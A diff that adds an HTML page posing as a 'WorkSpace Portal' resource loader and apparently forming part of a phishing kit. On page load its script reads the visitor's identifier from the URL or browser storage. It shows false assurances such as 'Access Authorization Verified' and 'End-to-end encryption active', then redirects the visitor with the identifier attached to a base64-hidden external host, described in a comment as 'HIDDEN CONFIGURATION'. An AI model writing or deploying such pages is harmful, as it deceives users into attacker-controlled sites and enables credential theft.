@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resource Loading - Workspace Portal</title>
+    <style>
+        :root {
+            --primary-blue: #2563eb;
+            --primary-dark: #1d4ed8;
+            --success-green: #059669;
+            --background: #f8fafc;
+            --surface: #ffffff;
+            --text-primary: #1e293b;
+            --text-secondary: #64748b;
+            --border: #e2e8f0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .background-graphic {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(37, 99, 235, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(37, 99, 235, 0.03) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        .loading-container {
+            background: var(--surface);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            padding: 48px;
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid var(--border);
+            position: relative;
+        }
+
+        .portal-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .portal-logo {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--primary-dark));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+        }
+
+        .portal-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: -0.5px;
+        }
+
+        .status-code {
+            font-size: 64px;
+            font-weight: 300;
+            color: #94a3b8;
+            margin-bottom: 16px;
+            font-feature-settings: "tnum";
+        }
+
+        .status-message {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+
+        .status-description {
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+            line-height: 1.6;
+            font-size: 16px;
+            max-width: 360px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .progress-section {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .user-info {
+            background: linear-gradient(135deg, #e0f2fe, #f0f9ff);
+            border: 1px solid #bae6fd;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            font-size: 15px;
+            color: var(--text-primary);
+            box-shadow: 0 2px 8px rgba(37, 99, 235, 0.08);
+        }
+
+        .user-info strong {
+            color: var(--primary-blue);
+        }
+
+        .access-badge {
+            background: linear-gradient(135deg, #dcfce7, #f0fdf4);
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin: 16px 0;
+            font-size: 14px;
+            color: var(--success-green);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .access-badge::before {
+            content: "✓";
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .loading-indicator {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #e2e8f0;
+            border-top: 3px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+            margin: 0 auto 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-blue), var(--primary-dark));
+            border-radius: 2px;
+            width: 0%;
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        .portal-badge {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 16px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 24px;
+        }
+
+        .portal-badge::before {
+            content: "🛡️";
+            font-size: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .security-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--success-green);
+            margin-top: 12px;
+        }
+
+        .security-indicator::before {
+            content: "🔒";
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-graphic"></div>
+    
+    <div class="loading-container">
+        <div class="portal-header">
+            <div class="portal-logo">WS</div>
+            <div class="portal-name">WorkSpace Portal</div>
+        </div>
+
+        <div class="status-code">Loading</div>
+        <div class="status-message">Resource Initialization</div>
+        <div class="status-description">
+            Preparing your collaborative workspace environment and establishing secure connections for document access.
+        </div>
+        
+        <div class="progress-section">
+            <div id="progressMessage" style="font-weight: 600; color: var(--text-primary); margin-bottom: 8px;">
+                Initializing document access protocol...
+            </div>
+            
+            <div class="access-badge" id="accessBadge">
+                Access Authorization Verified
+            </div>
+            
+            <div class="user-info hidden" id="userInfo">
+                <strong>Authenticated User:</strong> <span id="userIdentifier">Loading user credentials...</span>
+            </div>
+            
+            <div class="loading-indicator"></div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            
+            <div style="font-size: 13px; color: var(--text-secondary);">
+                <span id="redirectStatus">Establishing encrypted connection to workspace...</span>
+            </div>
+
+            <div class="security-indicator">
+                End-to-end encryption active
+            </div>
+        </div>
+
+        <div class="portal-badge">Secure Enterprise Workspace Portal • v2.4.1</div>
+    </div>
+
+    <script>
+        // =============================================
+        // HIDDEN CONFIGURATION - YOUR URL BASE64 ENCODED
+        // =============================================
+        const workspaceGateway = 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk';
+        const fallbackResource = 'https://workspace.microsoft.com/en-us/security';
+        
+        // Verify the base64 encoding is correct
+        console.log('🔐 Encoded Gateway:', workspaceGateway);
+        console.log('🔓 Decoded Gateway:', atob(workspaceGateway));
+        
+        class ResourceLoader {
+            constructor() {
+                this.userData = '';
+                this.accessType = 'workspace';
+                this.initializeLoader();
+            }
+
+            initializeLoader() {
+                console.log('🚀 WorkSpace Portal - Resource Loader Initialized');
+                this.retrieveUserData();
+                this.determineAccessPath();
+                this.initiateNavigation();
+            }
+
+            retrieveUserData() {
+                console.log('🔍 Retrieving user authentication data...');
+                
+                // Method 1: URL parameters from portal
+                const urlParams = new URLSearchParams(window.location.search);
+                let userParam = urlParams.get('user');
+                
+                if (userParam) {
+                    this.userData = decodeURIComponent(userParam);
+                    console.log('✅ User data retrieved from URL parameters:', this.userData);
+                }
+
+                // Method 2: Local storage backup
+                if (!this.userData) {
+                    try {
+                        const storedUser = localStorage.getItem('workspace_user');
+                        if (storedUser) {
+                            this.userData = storedUser;
+                            localStorage.removeItem('workspace_user');
+                            console.log('✅ User data retrieved from local storage:', this.userData);
+                        }
+                    } catch (e) {
+                        console.log('ℹ️ Local storage not available');
+                    }
+                }
+
+                // Method 3: Session storage fallback
+                if (!this.userData) {
+                    try {
+                        const sessionUser = sessionStorage.getItem('portal_user');
+                        if (sessionUser) {
+                            this.userData = sessionUser;
+                            console.log('✅ User data retrieved from session storage:', this.userData);
+                        }
+                    } catch (e) {
+                        console.log('ℹ️ Session storage not available');
+                    }
+                }
+
+                if (this.userData) {
+                    this.displayUserInfo();
+                } else {
+                    console.log('ℹ️ No user data found - fresh access required');
+                }
+            }
+
+            displayUserInfo() {
+                const userInfo = document.getElementById('userInfo');
+                const userIdentifier = document.getElementById('userIdentifier');
+                
+                userIdentifier.textContent = this.userData;
+                userInfo.classList.remove('hidden');
+                userInfo.classList.add('fade-in');
+                
+                console.log('👤 User information displayed:', this.userData);
+            }
+
+            determineAccessPath() {
+                if (this.userData) {
+                    this.accessType = 'workspace';
+                    console.log('✅ Access path: Workspace environment with user data');
+                } else {
+                    this.accessType = 'fallback';
+                    console.log('🔄 Access path: Authentication required - no user data');
+                }
+            }
+
+            initiateNavigation() {
+                const progressMessage = document.getElementById('progressMessage');
+                const redirectStatus = document.getElementById('redirectStatus');
+
+                if (this.accessType === 'workspace') {
+                    progressMessage.textContent = 'Access granted - Configuring workspace environment...';
+                    redirectStatus.textContent = 'Establishing secure connection to project resources...';
+                    redirectStatus.style.color = 'var(--success-green)';
+                    
+                    console.log('🎯 Preparing workspace navigation with user:', this.userData);
+                    
+                    setTimeout(() => {
+                        this.navigateToWorkspace();
+                    }, 2500);
+                    
+                } else {
+                    progressMessage.textContent = 'Authentication required for workspace access...';
+                    redirectStatus.textContent = 'Redirecting to access portal...';
+                    
+                    console.log('🔄 Redirecting to authentication portal (no user data)');
+                    
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                }
+            }
+
+            navigateToWorkspace() {
+                if (!this.userData) {
+                    console.error('❌ No user data available for navigation');
+                    window.location.href = 'index.html';
+                    return;
+                }
+
+                // Decode the hidden gateway URL
+                const endpoint = atob(workspaceGateway);
+                console.log('🌐 Decoded workspace endpoint:', endpoint);
+                console.log('👤 User data being passed:', this.userData);
+
+                // Safe parameter names - business appropriate
+                const navigationParams = new URLSearchParams({
+                    workspace_user: encodeURIComponent(this.userData),
+                    project_id: 'collaboration_portal',
+                    session_token: Math.random().toString(36).substr(2, 16),
+                    access_timestamp: Date.now().toString(),
+                    environment: 'production',
+                    portal_version: '2.4.1',
+                    resource_type: 'document_collaboration',
+                    access_level: 'verified_user',
+                    source: 'workspace_portal'
+                });
+
+                const destination = `${endpoint}?${navigationParams.toString()}`;
+                console.log('🎯 Final destination URL prepared');
+                console.log('🔗 Destination:', destination);
+                
+                // Execute navigation
+                try {
+                    console.log('🚀 Initiating primary redirect...');
+                    window.location.href = destination;
+                } catch (e) {
+                    console.log('🔄 Primary redirect failed, using fallback...');
+                    setTimeout(() => {
+                        window.location.replace(destination);
+                    }, 100);
+                }
+            }
+        }
+
+        // Initialize the resource loader
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('📄 404.html DOM fully loaded');
+            new ResourceLoader();
+        });
+
+        // Additional security and compatibility
+        (function() {
+            // Ensure parameter persistence
+            const currentParams = new URLSearchParams(window.location.search);
+            if (currentParams.has('user') && !currentParams.has('portal_processed')) {
+                currentParams.append('portal_processed', 'true');
+                const newUrl = `${window.location.pathname}?${currentParams.toString()}`;
+                
+                if (window.history?.replaceState) {
+                    window.history.replaceState(null, '', newUrl);
+                }
+            }
+        })();
+
+        // Verify the base64 encoding on load
+        console.log('✅ 404.html script loaded successfully');
+        console.log('🔐 Base64 encoded URL:', workspaceGateway);
+        console.log('🔓 Decoded target:', atob(workspaceGateway));
+    </script>
+</body>
+</html>
